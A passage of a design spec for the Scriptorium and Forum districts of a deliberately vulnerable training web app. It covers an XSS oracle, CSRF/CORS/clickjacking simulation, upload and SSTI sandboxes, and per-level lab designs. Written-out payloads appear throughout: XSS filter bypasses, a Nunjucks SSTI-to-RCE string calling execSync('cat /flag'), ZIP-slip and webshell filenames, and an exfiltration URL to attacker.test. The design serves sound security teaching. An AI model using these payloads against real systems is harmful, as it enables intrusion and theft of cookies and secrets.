# HVWA Phase 2 — Scriptorium (SC-01…11) & Forum of Pilgrims (FP-01…12): engine + per-level design

> **Status: DESIGN (binding).** Architect spec for Phase 2's two harder districts. Written against the real
> engine (`src/core/*`, master `70f42ae`), the plan (`docs/superpowers/plans/2026-11-15-hvwa.md`) and
> `docs/RECIPES.md`. Read-only on the repo. Scriptorium rows SC-12…20 (XXE/SSRF/deserialization) are **out of
> scope** here (Phase 3). This file covers **SC-01…11** and **FP-01…12** (23 labs) plus the cross-cutting engine
> they need. Every engine task below gets its own spec-review gate, like Batch D's D0. The lab designs are
> precise enough to implement without further input.

Conventions follow `docs/RECIPES.md`: five-file folders (`challenge.ts`, `model.ts`, `levels/*.ts`, `views/*.ejs`,
`<id>.spec.ts`), render only via `sendPage`, flags only via `flagFor`, per-player state only via `perSession`,
bilingual `title`/`summary`/hints, one distinct flaw per level (step-up case (g) must hold), Divine resists every
exploit and never issues a flag. The Gatekeeper victim-driven labs (GK-09/10/11/16) and `_shared/twin.ts` are the
reference.

---

## 0. What Phase 2 forces the engine to grow

The Gatekeeper engine (`core/sim/*`, `core/victim.ts`, `core/lab.ts`) models a **simulated victim with a browser
that does not run JS**, a cookie jar, redirects, `Refresh` forwarding and `Referrer-Policy` — but it has **no**
model of: executable HTML sinks (XSS), SameSite/Origin (CSRF), CORS, framing (clickjacking), file uploads, archive
parsing, or template evaluation. Phase 2 needs all of these, added minimally and deterministically in the D0 style.
Five engine capabilities, mapped to tasks E0–E4 (section 2):

| Capability | New code (not in `core/sim/`, unless noted) | Labs that depend on it |
|---|---|---|
| **XSS oracle** — does attacker HTML create an executable sink? | `core/xss/` (parse5) + sandbox-preview helper | SC-01, SC-02, SC-04, SC-05, SC-06, SC-09, FP-05, FP-12 |
| **Client-JS twins** — DOM router / pollution gadget evaluated server-side | lab-local twin fns + `core/xss` oracle on their output | SC-03, FP-11 |
| **Cross-site requests** — Origin, SameSite jar, CORS eval, frame eval | `core/sim/` additions (stay pure) + `core/victim.ts` presets | FP-01, FP-02, FP-03, FP-04 |
| **Uploads & sim filesystem** — multipart, caps, ZIP, image sniff, exec sim | `core/upload.ts` + lab-local sim FS (`perSession`) | SC-05, SC-07, SC-08, SC-09, SC-10, SC-11 |
| **SSTI sandbox** — Nunjucks + "RCE" in a memory-safe JS sandbox | `core/ssti/` (QuickJS-WASM in a worker_thread) | FP-06, FP-07 |

Labs needing **no** new engine: FP-08 (open redirect — `sendSimRedirect` exists), FP-09 (IDOR — `challengeDb` +
`perSession`), FP-10 (second-order SQLi — `challengeDb`).

New runtime dependencies proposed (all small, all ≥ 2 weeks old, none reachable from `core/sim/` so its
no-network import guard is untouched): `parse5@8.0.1` (+ its `entities`), `quickjs-emscripten-core@0.32.0` +
`@jitl/quickjs-wasmfile-release-sync@0.32.0` (+ `@jitl/quickjs-ffi-types`), `nunjucks@3.2.4` (loaded **only**
inside the sandbox). **No** multipart dependency (Node 22's built-in `undici` `Response.formData()` parses it —
proven below). See section 4 (open questions) for the controller sign-off these need.

---

## A. Engine design — the hard decisions

### A1. XSS proof (the big one)

**The problem.** The flag must appear only when the response *proves* the flaw; the victim's browser runs no JS;
running player-supplied JS in the server process is RCE on the host. The player's *own* browser does run JS, so we
must also stop a real XSS from harming the player's HVWA session.

**Options.**

- **(i) Static oracle (parse5).** Parse the exact bytes the victim would see with parse5 (the reference HTML5
  tree-construction algorithm browsers use), walk the tree, decide whether attacker-controlled bytes created an
  *executable sink*. Deterministic, auditable, in-process, no code execution.
  *Measured* (`parse5@8.0.1`, this box): attribute-context values with angle brackets stay inside the attribute and
  serialize escaped → **not** a sink; a real `<script>` element, an `on*` handler, a `javascript:`/`data:` URL on a
  navigable, `srcdoc`, SVG `<script>`/`<foreignObject>` → **sink**. mXSS (serialize → reparse differential, and
  `scriptingEnabled` `<noscript>` handling) is decidable by reparsing. Cost: one dep (`parse5` + `entities`,
  ~0.8 MB) and the sink-rules table. Risk: the rules table is the thing to get right (bounded, enumerable).
- **(ii) Real JS sandbox (QuickJS-WASM, or a headless-browser container).** QuickJS-emscripten is a *memory-safe
  WASM* interpreter: in-process, no host bindings unless we add them, interrupt-deadline kills loops, a bounded
  `WebAssembly.Memory` caps allocation (all **measured** below, A4). It *is* a real sandbox, so it satisfies the
  plan's "only inside a real sandbox" bar without Docker. A headless-browser container is the heavyweight variant:
  a second compose service, more memory than 512m likes, slow, and a network stack we do not want. For XSS,
  running arbitrary JS is overkill — we only need "would a script node have executed", which is a *parsing*
  question, not an *execution* one.
- **(iii) Twin model.** For sinks created by the lab's *own* client JS (DOM XSS router, prototype-pollution
  gadget), the server response is benign HTML + a vulnerable script; parse5 of the response shows no sink. Mirror
  that client code with a tiny server-side twin (as GK-10's `landing` mirrors the callback page), run the oracle
  on the twin's output HTML.

**Recommendation — hybrid (i)+(iii); hold (ii)/QuickJS for SSTI only.**

- **Server-rendered sinks** (SC-01 reflected, SC-02 stored, SC-04 markdown, SC-05 SVG, SC-06 mXSS, FP-05 bio,
  SC-09 polyglot payload, FP-12 email HTML-injection): a **deterministic static oracle** in `src/core/xss/oracle.ts`
  on **parse5**. API:

  ```ts
  // core/xss/oracle.ts
  export interface Sink { readonly kind: 'script'|'event-handler'|'url-scheme'|'srcdoc'|'svg-script'|'style-import';
                          readonly detail: string }
  export interface XssVerdict { readonly executes: boolean; readonly sinks: readonly Sink[];
                                readonly reachedMarker: boolean; readonly mxss: boolean }
  /** Parse `html` with parse5 (scriptingEnabled:true — a real browser), find sinks whose content/URL contains
   *  the lab's unique marker call `hvwa('<nonce>')`, and whether a serialize→reparse round trip changes the sink
   *  set (mXSS). Pure; no code runs. */
  export function xssOracle(html: string, marker: string): XssVerdict;
  ```

  The lab embeds the player's input into its page/fragment exactly as the vulnerable level built it, with the
  attacker's intended marker `hvwa('<nonce>')` where a payload would call out. `executes` is true iff a sink would
  run that marker. The oracle is the ground truth for "the admin's browser ran attacker script".

- **Client-rendered sinks** (SC-03 DOM, FP-11 prototype pollution): a **twin** of the lab's client JS in the level
  file (`route(hash)`, `merge(src)+render()`), producing the HTML the browser's DOM would hold; the oracle runs on
  that. No general JS engine.

- **How cookie theft / "admin views the page" feeds the attacker log.** XSS proof plugs into the **existing
  victim framework**. A victim action ("the admin opens your review / profile / shared page") makes the simulated
  admin browser `follow()` the citadel URL; the citadel handler returns the attacker-influenced HTML; a thin wrap
  in `core/victim.ts` (the "XSS sink interpreter", E0) runs `xssOracle(body, marker)` on the response the admin
  received, and **iff `executes`**, appends one entry to the player's attacker log carrying the admin's canary
  (`GET http://attacker.test/st%20steal?c=<ADMIN_CANARY>`). That canary is the per-session flag (via `flagFor`
  mapping, section B). So the model is identical to GK-10's "the leak lands in the attacker log"; the only new
  piece is the oracle deciding *whether* the admin's browser would have run the script. Stored-XSS labs persist the
  payload per session; the admin action reads it back.

- **How the player SEES it work in their real browser, safely.** The lab page renders the vulnerable fragment for
  the player too (that is the whole point — they watch the payload fire). It renders it **inside a sandboxed
  preview iframe** — `core/xss/preview.ts` → `previewFrame(fragment)` returns
  `<iframe sandbox="allow-scripts" srcdoc="…">`. `sandbox="allow-scripts"` **without** `allow-same-origin` gives the
  frame a **null, opaque origin**: the payload's `alert()`/marker fires and the player sees it, but the frame
  **cannot** read `document.cookie` of the lab origin, cannot reach `hvwa_sid`, and cannot script the platform DOM
  or call `/api/submit`. The flag still comes only from the server-side oracle. So the player's observation is
  decorative; the proof is server-side.

- **What stops real XSS from hurting the player's own HVWA session.** Four layers, in order of importance:
  1. **`hvwa_sid` is `HttpOnly` + `SameSite=Lax`** (`core/cookies.ts COOKIE_OPTIONS`, verified). Injected JS can
     neither read the player's session id via `document.cookie` nor have it ride a cross-site request. Session
     theft of the *player* is impossible by construction.
  2. **Flags are server-issued HMACs** (`issueFlag`), emitted only when the oracle/twin proves the exploit. Client
     JS cannot forge one, and "XSS reads the flag" is just the player solving *their own* single-player lab — no
     privilege crosses a trust boundary.
  3. **Per-session isolation** (`perSession`): one player's stored payload never reaches another player; the admin
     victim is simulated per player+level.
  4. **Sandboxed preview** (above): the one place attacker JS actually runs in the player's browser is an
     origin-isolated frame, so it cannot touch the platform even within the player's own session.
  Residual risk, documented and accepted: all labs share the loopback origin, so a payload the player pastes
  *outside* the preview frame could script the player's own platform DOM (same session, single-player, loopback).
  We do **not** add `allow-same-origin` to the preview, we keep `hvwa_sid` HttpOnly, and we never render raw lab
  input into a *platform* page — only into the lab's own view (escaped) or the preview frame.

**CSP.** XSS labs need **no** CSP to be exploitable, and we add **none** globally (it would risk htmx/inline-EJS on
platform pages, which have no CSP today). Divine XSS levels *may* set a **route-scoped** `Content-Security-Policy`
(e.g. `script-src 'self'; object-src 'none'`) as part of the fix — teaching value — via the `setLabHeaders` helper
(A5), never touching platform pages.

### A2. Victim extensions for FP (CSRF, CORS, clickjacking, email)

The current `SimBrowser` models only *top-level* navigations: a citadel request answered in-process, or an
attacker request logged. FP-01…04 need the **attacker page's** cross-site behaviour. Extend `core/sim/` minimally
and **purely** (the no-network guard in `tests/sim.spec.ts` allows only `node:buffer`/`node:fs` + own files —
these additions add no imports). Engine task **E1**.

**New jar attribute — SameSite.** `core/sim/cookies.ts` today accepts and ignores SameSite. Add parsing of
`SameSite=Strict|Lax|None` (store it; default Lax, matching `hvwa_sid`), and a **request-context** parameter on
`headerFor(target, ctx)` where `ctx = { site: 'same'|'cross', method, topLevel }`:
- `Strict` → sent only when `site==='same'`.
- `Lax` → sent on same-site always, and on cross-site only for a **top-level GET navigation** (not subresource,
  not POST).
- `None` → always sent (requires `Secure`, which the sim treats as citadel-only over http = permitted for the lab).

**New request shaping — Origin + Sec-Fetch.** The browser adds, on cross-site requests it issues from a page on
another origin: `Origin: http://attacker.test` (POSTs always carry it; cross-site GET subresource too; same-site
requests omit it unless POST), and `sec-fetch-site: cross-site|same-origin`. Same-site navigations keep today's
behaviour.

**New attacker-page primitives** (methods on `SimBrowser`, used by victim presets — the attacker page is the
player's input, modelled declaratively, never a real JS engine):
- `crossSitePost(url, form, { contentType })` — the admin's browser auto-submits the attacker page's hidden form /
  issues `fetch(url,{method:'POST',credentials:'include',body,headers})` to a citadel URL. The sim builds the
  request with SameSite-filtered cookies, `Origin: attacker.test`, the chosen content-type, runs the citadel
  handler (the level's real code), and records the outcome. This is CSRF (FP-01 form-encoded, FP-02 JSON).
- `corsFetch(url, { credentials })` — `fetch(citadel, {credentials:'include'})` from the attacker page. The sim
  runs the handler, reads `Access-Control-Allow-Origin`/`-Credentials` on the response, and **enforces the browser
  rule**: the attacker JS may READ the body (and thus exfiltrate it to the attacker log) **only** if ACAO equals
  the origin (or `*` with `credentials:'omit'`) **and**, for a credentialed read, `ACAC: true` **and** ACAO ≠ `*`.
  When the read is allowed the sim appends the body's canary to the attacker log; when blocked it logs nothing (as
  a browser's SOP would). FP-03.
- `frame(url)` — the attacker page embeds citadel in an `<iframe>`. The sim reads `X-Frame-Options`
  (`DENY`/`SAMEORIGIN`) and CSP `frame-ancestors`; returns `{ framed: boolean, reason }`. If framed, a follow-up
  `clickThrough(formUrl, form)` models "the admin clicked the overlaid button" → a **same-site** (citadel-frame →
  citadel) POST carrying the admin's cookies (Lax sent: it is same-site). FP-04.

All five additions respect `SIM_LIMITS`, copy every stored field (section "Limits" in RECIPES §8), live under the
≤150 shared world budget, and open no socket. `core/victim.ts` gets three presets mirroring the existing
`checkMailAction`/`sendLinkAction` style, each with a REQUIRED `rearm`:
`visitAttackerPageAction` (CSRF/CORS: runs `crossSitePost`/`corsFetch`), `frameAndClickAction` (clickjacking). The
panel already renders the attacker log and the player's mailbox — no view change beyond labels.

**Email notification rendering (FP-12).** No new primitive: reuse `simInbox`. The citadel "sends" the notification
by `world.inbox.deliver({ to: ADMIN_MAILBOX, subject, body, links })` with the attacker-influenced field embedded.
FP-12 is **HTML injection in email**, not script: email clients run no JS, so the proof is that attacker HTML
produced either (a) an attacker **link/image** the admin's client loads/clicks → hits the attacker log, or (b)
spoofed content. The admin "checks mail" (`checkMailAction`) and the sim, for the email body, uses the oracle's
*link/resource* detection (not script execution) to decide whether a request to attacker.test fires. This keeps
FP-12 distinct from the script-XSS labs.

### A3. Uploads and files (SC-05/07/08/09/10/11)

**Simulated filesystem.** Per player+level, an in-memory `Map<string,{bytes:Buffer,contentType:string}>`, created
in the lab's `perSession` factory exactly as GK-06 holds `files: ReadonlyMap<string,string>`. Nothing touches the
real disk. Bounded: ≤ 64 files, ≤ 256 KiB each, ≤ 2 MiB per lab (enforced in the level/model, not the platform).

**Multipart parser — NO new dependency.** Node 22.22's built-in WHATWG body (`undici@6.23`) parses multipart.
**Measured** on this box:

```js
const fd = await new Response(bodyBuffer,
  { headers: { 'content-type': req.headers['content-type'] } }).formData();
// → entries: string fields, and File objects with .name (filename, path separators preserved),
//   .type (declared content-type), .size, .arrayBuffer()/.text(). Malformed body → TypeError (catchable).
```

Provide `core/upload.ts`:

```ts
// core/upload.ts
export interface UploadedFile { readonly field: string; readonly filename: string;
                                readonly contentType: string; readonly bytes: Buffer }
export interface ParsedUpload { readonly fields: Record<string,string>; readonly files: readonly UploadedFile[] }
/** Parse req (Express raw Buffer body from express.raw({type:'multipart/form-data', limit})) with the built-in
 *  Response.formData(). Caps: total ≤ maxBytes, ≤ maxFiles, each ≤ maxFileBytes. Throws UploadError on malformed
 *  input or a cap — callers wrap in tryDb(req, …, 'Upload error'). No dependency. */
export async function parseMultipart(req, opts: { maxBytes; maxFiles; maxFileBytes }): Promise<ParsedUpload>;
```

Mount per-upload-lab with `express.raw({ type: 'multipart/form-data', limit: '2mb' })` on that route only (the
app-wide `express.json()/urlencoded()` ignore multipart, so no conflict). nginx `client_max_body_size 25m` and
`proxy_request_buffering off` already allow upload bodies through (verified in `docker/proxy/nginx.conf`). **Note**
`parseMultipart` is async; RECIPES §4(g) and `tryDb` require sync callbacks, so upload handlers `await` the parse
*outside* `tryDb`, then do any sync FS/validation work inside it.

**Size caps.** `maxBytes` 2 MiB (route body limit + explicit check), `maxFiles` 8, `maxFileBytes` 512 KiB.

**ZIP parsing (SC-10 ZIP slip) — hand-rolled, no dependency.** Read the End-Of-Central-Directory record, walk the
central directory for entry names, sizes and the stored/deflate method, and inflate with `node:zlib.inflateRawSync`
(deflate) or copy (stored). ~90 lines in `core/upload-zip.ts` (or lab-local — it teaches structure). Reject
> 64 entries, > 2 MiB inflated total (zip-bomb guard). The lab "extracts" each entry into the sim FS at
`join(targetDir, entryName)` with the level's (flawed) path handling; ZIP slip = an entry name like
`..\\..\\templates\\welcome` escaping `targetDir` to overwrite a sentinel file whose later read returns the canary.
Hand-rolled is recommended over yauzl/adm-zip (teaches the central-directory structure; no dep).

**"Webshell executes" (SC-07/08) — simulated interpretation, NEVER real code.** The sim FS has a tiny **simulated
web server**: `GET <lab>/uploads/<name>` looks the file up; it is "executed" only if the level's (flawed) handler
maps its name to an interpreter. "Execution" = a stand-in interpreter that recognises a marker in the uploaded
bytes — e.g. a `.php` body containing `<?hvwa CANARY ?>` makes the simulated interpreter emit that session's canary
(and nothing else). No PHP/EJS/Node ever runs; the uploaded bytes are pattern-matched. The *lesson* is the upload
**filter** (SC-07 extension denylist/allowlist bypass; SC-08 double extension `shell.php.jpg` /
`shell.php%00.jpg` / trailing-dot); the "shell" is a token oracle. Proof: the uploaded file is stored at a path the
server treats as executable AND the simulated interpreter emits the canary.

**Polyglot image check (SC-09).** A hand-rolled magic-byte + dimension sniff in the level (GIF `GID87a/89a`, JPEG
`FFD8…`, PNG `\x89PNG`, read width/height from the header) — no dep. The upload passes the image validator *and*
carries an executable payload; proof: it passes `looksLikeImage(bytes)` AND the simulated interpreter / oracle finds
the executable sink. This teaches "content-type/magic-byte checks are not integrity checks".

**Path traversal (SC-11).** A download endpoint `GET <lab>/download?file=…` reads from the sim FS; the level's
(flawed) normalisation lets `../` escape the served directory to a secret file holding the canary. Pure string
handling over the sim FS; no real FS.

### A4. SSTI (FP-06/07)

**Where Nunjucks runs.** Inside **QuickJS-emscripten** (`quickjs-emscripten-core@0.32.0` +
`@jitl/quickjs-wasmfile-release-sync@0.32.0`), a **memory-safe WebAssembly** JS interpreter, hosted in a
**`worker_thread`**, in-process — **no Docker, no network, no second compose service.** Nunjucks' browser build is
loaded as a string into the sandbox; it never runs in the host realm. **Measured** on this box (Node 22.22):

- Module load ~8 ms; one render ~15 ms (boot ~13 ms warmable, render ~2 ms).
- `rt.setInterruptHandler(shouldInterruptAfterDeadline(Date.now()+ms))` stops `while(true){}` at the deadline
  (measured: interrupted at ~50 ms). `{% for i in range(0,1e8) %}` → interrupted.
- `rt.setMemoryLimit(32<<20)` + a bounded `WebAssembly.Memory({initial:16MiB, maximum:64MiB})` on the variant caps
  allocation: an unbounded string/array loop returns `out of memory` and **does not** grow host RSS past the 64 MiB
  cap (measured: wasm buffer pinned at 63.4 MiB, host RSS recovered after). `setMaxStackSize(256*1024)` turns deep
  recursion into a catchable `stack overflow` instead of a host crash.
- No host reach: inside the sandbox `process`, `require`, `fetch`, `globalThis.<host>` are all `undefined` unless we
  inject them. Nunjucks renders (`{{user.name}} {{7*7}}` → `pilgrim 49`).

**What "RCE" proves inside FP-07.** We inject a **fake** `child_process` bridge: a host function `__sh(cmd)` the
sandbox's `process.mainModule.require('child_process').execSync` calls, returning canned output and, for the
planted "flag file" (`cat /srv/forum/flag` or `process.env.FLAG`), the session canary. **Measured**: the canonical
SSTI→RCE payload `{{range.constructor("return process.mainModule.require('child_process').execSync('cat /flag')")()}}`
returns the planted flag through the fake bridge. "RCE" = reading a planted flag string in the sandbox; nothing
executes on the host, because QuickJS is a WASM memory-sandbox whose only host binding is the fake shell we chose
to expose.

**How FP-07 stays safe on the host / P0-SEC fit.** QuickJS-WASM runs in the app process, so it inherits the
container's read-only rootfs, non-root `node`, `pids_limit`, `mem_limit: 512m`. The sandbox adds its own CPU bound
(interrupt deadline), memory bound (bounded `WebAssembly.Memory`) and stack bound. The `worker_thread` gives a hard
`terminate()` backstop and keeps the WASM heap off the main heap; a warm module is reused across evals. **No new
compose service, no internal-network change.**

**Engine task E4 — `core/ssti/`:**

```ts
// core/ssti/sandbox.ts — a long-lived worker_thread hosting one warm QuickJS module.
export interface SstiResult { readonly ok: boolean; readonly output?: string; readonly error?: string;
                              readonly shellCalls: readonly string[] }
/** Render `template` with Nunjucks INSIDE the sandbox, context = `ctx`, with a fake execSync that returns
 *  `shell(cmd)`. Deadline `timeoutMs` (default 250), memory-capped, no host reach. */
export function renderInSandbox(input: { template: string; ctx: Record<string,unknown>;
  shell: (cmd: string) => string; timeoutMs?: number }): Promise<SstiResult>;
```

**Tests without Docker.** `renderInSandbox` is called through a **transport seam**: unit tests inject a
**fake transport** that runs the QuickJS eval on the main thread (same sandbox, no worker) — fast, deterministic,
no worker lifecycle. `verify:dist` / an integration spec exercises the **real worker_thread** transport. This
mirrors Batch D's "fake transport in unit tests, real in `verify:docker`". Because the sandbox is in-process WASM,
`verify:docker` needs no extra service; the SSTI integration test runs under plain `npm test` with the worker
transport too.

**If the controller prefers a container.** If QuickJS-as-a-dependency is rejected, FP-07 falls back to the
plan's original "RCE worker container": a minimal compose service `sandbox` on the internal `lab` network, read-only
rootfs, non-root, `pids_limit`, no egress, talking to `app` over a tiny line-delimited JSON protocol on `lab`; the
app uses a fake transport in unit tests and the real socket in `verify:docker`. This is **more** infrastructure for
**less** isolation than QuickJS-WASM already gives (a container shares the kernel; WASM does not expose the host at
all), and it breaks Phase 2's "no new infra" promise. Recommended answer: **QuickJS-WASM, no container** (section 4,
Q3).

### A5. CSP / global-header changes

**Principle: never weaken platform pages; relax per route only.** Today there is no CSP, no `X-Frame-Options`
anywhere, and the portal/challenge-player pages use htmx + inline EJS. Add a tiny helper and change nothing global:

```ts
// core/http.ts
export function setLabHeaders(res, h: { csp?: string; frameAncestors?: string; xfo?: 'DENY'|'SAMEORIGIN';
  cors?: { allowOrigin?: string; allowCredentials?: boolean } }): void;
```

- **XSS labs (SC/FP):** exploitable with **no** header change (HttpOnly cookie + server-side flag protect the
  player; the preview frame isolates their view). Divine levels *may* add a route-scoped CSP as the fix.
- **Clickjacking FP-04:** Acolyte sets **no** framing header (framable); Divine sets `X-Frame-Options: DENY` +
  `Content-Security-Policy: frame-ancestors 'none'` on its route only. The sim's `frame()` reads exactly these.
- **CORS FP-03:** each level sets `Access-Control-Allow-Origin`/`-Credentials` on its own API route; the sim's
  `corsFetch` enforces the browser rule. Platform routes never send CORS headers.
- **The proxy stays transparent** (`docker/proxy/nginx.conf` adds no headers) — unchanged; all lab headers come
  from the app route itself. **No `docker-compose.yml`, Dockerfile or nginx change is required by Phase 2** except
  (optionally) the controller's choice on the SSTI dependency.

---

## 2. Engine tasks (ordered, each with its own spec-review gate)

Like D0: write the engine task + its spec first, review, then build the labs that depend on it. Dependencies are
noted; within a task, TDD.

- **E0 — `core/xss/` XSS oracle + sandbox preview.** `oracle.ts` (parse5 sink detection, marker reachability,
  mXSS differential), `preview.ts` (`previewFrame`), and the `core/victim.ts` wrap that runs the oracle on the
  admin's received HTML and logs the canary. Dep: `parse5`. Guard spec: oracle sink matrix (attribute vs element
  vs URL-scheme vs srcdoc vs svg-script vs style), escaped-source negatives, mXSS positives, marker reachability,
  per-session isolation. **Blocks:** SC-01, SC-02, SC-03, SC-04, SC-05, SC-06, SC-09, FP-05, FP-11, FP-12.
- **E1 — `core/sim/` cross-site + `core/victim.ts` presets.** SameSite jar, Origin/Sec-Fetch shaping,
  `crossSitePost`/`corsFetch`/`frame`/`clickThrough`, the three presets. Stays within the no-network import guard.
  Guard spec: SameSite Strict/Lax/None × same/cross × GET/POST/top-level matrix; Origin presence; CORS read-allow
  matrix (ACAO exact/`*`/mismatch × ACAC × credentials); framing allow/deny matrix; budget/caps/copies.
  **Blocks:** FP-01, FP-02, FP-03, FP-04.
- **E2 — `core/upload.ts` (+ `upload-zip.ts`).** `parseMultipart` (built-in `Response.formData()`, caps,
  `UploadError`), the zip central-directory reader + `inflateRawSync`, `looksLikeImage`. Guard spec: field/file
  parse, filename with path separators preserved, content-type preserved, caps enforced, malformed → UploadError,
  zip entry names/methods, zip-bomb guard, image sniff true/false. **Blocks:** SC-05, SC-07, SC-08, SC-09, SC-10,
  SC-11.
- **E3 — client-JS twin helpers.** Thin: a documented pattern + two tiny shared helpers (`hashRoute`,
  `safeishMerge`) reused by SC-03 and FP-11 level files, feeding E0's oracle. May be folded into E0 if small.
  **Blocks:** SC-03, FP-11.
- **E4 — `core/ssti/` sandbox.** QuickJS-WASM worker_thread, `renderInSandbox`, fake-transport seam, Nunjucks
  loader. Deps: `quickjs-emscripten-core`, `@jitl/quickjs-wasmfile-release-sync`, `nunjucks`. Guard spec: render,
  interrupt on infinite loop/`for range`, memory cap on allocation, stack cap on recursion, no host reach
  (`process`/`require`/`fetch` undefined), fake-shell canary, both transports agree. **Blocks:** FP-06, FP-07.

**Order:** E0 → (E2 ∥ E1) → E3 → E4. E0 first (most labs). E1 and E2 are independent and parallelisable after E0.
E4 last (heaviest deps; only two labs).

---

## B. Per-lab designs

Shared Scriptorium/Forum plumbing goes in `scriptorium/_shared/` and `forum/_shared/` (a `pilgrimLogin`-style
sign-in where a lab has an account, the attacker-log/mailbox panel is automatic). Every lab serves `GET /` at every
level with the lab bar. Marker nonce `hvwa('<nonce>')` is per session+level (a `flagFor`-adjacent canary).

Legend per lab: **slug · goal · page · levels (A/T/I/D flaws) · Divine · flag proof · victim+rearm · solve path ·
model.ts seams · pitfalls · hints (ID+EN, no payloads).**

### SC-01 — Reflected XSS (search) · `reflected-xss`
- **Goal.** Reflect a script into the Scriptorium search results that the librarian (admin) "views".
- **Page.** A search box; results echo the query ("No scrolls match **\<q\>**").
- **Levels.** **A** query concatenated into HTML unescaped. **T** `<script>` tags stripped once (case-sensitive,
  non-recursive) → `<scr<script>ipt>` / `<SCRIPT>` / event-handler attributes survive. **I** HTML-escapes `<`/`>`
  but reflects the query inside an attribute value without quoting (`<input value=<q>>`) → break out with a space +
  `onfocus=…` autofocus, no angle brackets. **D** context-correct escaping (attribute value quoted + escaped),
  `Content-Security-Policy: script-src 'self'`.
- **Divine.** Escape per context; CSP as defence-in-depth; comment notes CSP alone is not the fix.
- **Flag proof.** Victim "views your search link"; the citadel renders the reflected page; `xssOracle(body,marker)`
  `.executes` → the admin canary lands in the attacker log = flag. Player also sees it in the preview frame.
- **Victim + rearm.** `sendLinkAction` (the admin opens the search URL you send). `rearm: () => {}` (no standing
  state; the admin just views).
- **Solve path.** A: `?q=<script>hvwa('n')</script>`. T: `<img src=x onerror=hvwa('n')>` or `<SCRIPT>`. I: break the
  unquoted attribute with `?q=x autofocus onfocus=hvwa('n')`. D: resisted.
- **model.ts seams.** `markerFor(sessionId,level)`; `reflect(level, q): string` (the fragment each level builds);
  `labState.canary`.
- **Pitfalls.** Oracle must run on the **exact** bytes the level emits (not a re-escaped copy). Preview frame must
  carry the SAME fragment so player and oracle agree. Keep the reflected value in the player's view escaped *in the
  lab chrome*; only the vulnerable fragment is raw.
- **Hints.** 1) ID: "Hasil pencarian menampilkan kembali kata Anda — persis seperti apa?" EN: "The results echo your
  words — echoed how, exactly?" 2) ID: "Satu konteks HTML tidak membutuhkan tanda kurung sudut sama sekali." EN:
  "One HTML context needs no angle brackets at all." 3) ID: "Jika tag disaring, atribut kejadian sebuah elemen
  biasa bisa menggantikannya." EN: "If tags are filtered, an ordinary element's event attribute can stand in."

### SC-02 — Stored XSS (review) · `stored-xss`
- **Goal.** Store a script in a scroll review that the moderator (admin) reads.
- **Page.** A scroll with a review list + "add review" form; reviews render below.
- **Levels.** **A** review body stored and rendered raw. **T** a denylist strips `<script`/`onerror` substrings
  (bypass: `<svg onload=…>` / `<img onpointerenter>` / mixed case). **I** a naive sanitizer removes disallowed
  *tags* but keeps attributes and does not re-parse → `<a href=javascript:…>` or an allowed tag with an injected
  handler survives. **D** an allowlist sanitizer on parsed nodes (tag + attribute + URL-scheme allowlist), output
  re-serialized.
- **Divine.** Parse → allowlist → re-serialize; comment: never regex-sanitize HTML.
- **Flag proof.** Payload persists (`perSession`); victim "reads the newest review"; oracle `.executes` → attacker
  log canary = flag.
- **Victim + rearm.** `checkMailAction`-style custom action "the moderator opens the scroll and reads the newest
  review" (follows `/scroll` then the review); `rearm: () => {}`.
- **Solve path.** A: `<script>hvwa('n')</script>`. T: `<svg onload=hvwa('n')>`. I: `<a href="javascript:hvwa('n')">x</a>`
  on a click twin, or an allowed tag carrying `onmouseover`. D: resisted.
- **model.ts seams.** `reviews(req): Review[]` (per session); `renderReview(level, body): string`; `markerFor`.
- **Pitfalls.** Stored state is `perSession` + bounded (cap reviews at 20, newest kept). `reset` is allowed (stored
  payload can wedge the view) — no limiter here, so `reset: (req)=>labs.reset(req)` is fine. The I sanitizer must be
  a *believable* flawed one, distinct from T's denylist.
- **Hints.** 1) ID: "Ulasan Anda bertahan dan dibaca orang lain nanti." EN: "Your review persists and someone reads
  it later." 2) ID: "Pemblokiran berbasis kata hanya menutup ejaan yang terpikirkan penulisnya." EN: "Word-based
  blocking only closes the spellings the author imagined." 3) ID: "Membuang tag tanpa membaca ulang pohon HTML
  meninggalkan atribut hidup." EN: "Stripping tags without re-reading the HTML tree leaves attributes alive."

### SC-03 — DOM XSS (hash router) · `dom-xss`
- **Goal.** Drive the client-side hash router into an HTML sink.
- **Page.** A single-page "scroll viewer": a vendored lab script reads `location.hash` and renders a section into a
  `#view` div. The script is shown verbatim (View Source) and has a **server-side twin** in the level file.
- **Levels.** **A** `view.innerHTML = decodeURIComponent(location.hash.slice(1))`. **T** the router only routes
  known section ids but falls back to `innerHTML` of an "unknown section: <id>" message built from the hash. **I**
  it uses `textContent` for the message but builds one branch with `insertAdjacentHTML` for a "search within scroll"
  (`#search=<q>`). **D** a strict id allowlist → `textContent` only; unknown → static "not found".
- **Divine.** Route to a fixed set; never pass hash data to an HTML sink.
- **Flag proof.** The **twin** `route(hash): {html}` mirrors the client script; `xssOracle(html,marker).executes`
  → flag. The player's real browser runs the real client script in the preview frame and sees it fire; the server
  twin is the oracle's input, keeping it deterministic (no JS run server-side).
- **Victim + rearm.** `sendLinkAction` (admin opens the `#…` link you send). `rearm: () => {}`. (Fragments aren't
  sent to servers, so the admin "opening" it is modelled as the twin running on that hash.)
- **Solve path.** A: `#<img src=x onerror=hvwa('n')>`. T: `#nope<img src=x onerror=hvwa('n')>` via the fallback. I:
  `#search=<img src=x onerror=hvwa('n')>`. D: resisted.
- **model.ts seams.** `route(level, hash): { sink: string; html: string }` (the twin); `clientScriptSrc` (served
  verbatim + twinned); `markerFor`.
- **Pitfalls.** The twin and the shipped client script MUST stay in lock-step (one source of truth: generate the
  twin's routing table and the client script from the same constant, or test that both agree on a payload corpus).
  Teaches DOM-vs-reflected distinction: the server response is identical at every level; only the client logic
  differs.
- **Hints.** 1) ID: "Server mengirim HTML yang sama tiap kali; perubahan terjadi di peramban." EN: "The server sends
  the same HTML every time; the change happens in the browser." 2) ID: "Bagian setelah tanda pagar tidak pernah
  sampai ke server." EN: "The part after the # never reaches the server." 3) ID: "Cari di mana skrip menaruh teks
  URL ke dalam halaman sebagai HTML, bukan sebagai teks." EN: "Find where the script puts URL text into the page as
  HTML, not as text."

### SC-04 — Markdown renderer XSS · `markdown-xss`
- **Goal.** Smuggle script through a Markdown→HTML renderer.
- **Page.** A note editor with live Markdown preview; notes render to HTML.
- **Levels.** **A** a tiny hand-rolled Markdown renderer that passes raw HTML through (`<script>` survives). **T**
  it strips `<...>` HTML but renders link syntax without scheme checks → `[x](javascript:hvwa('n'))`. **I** it
  blocks `javascript:` in links but allows `![alt](src "title")` to put the title/`src` into an attribute
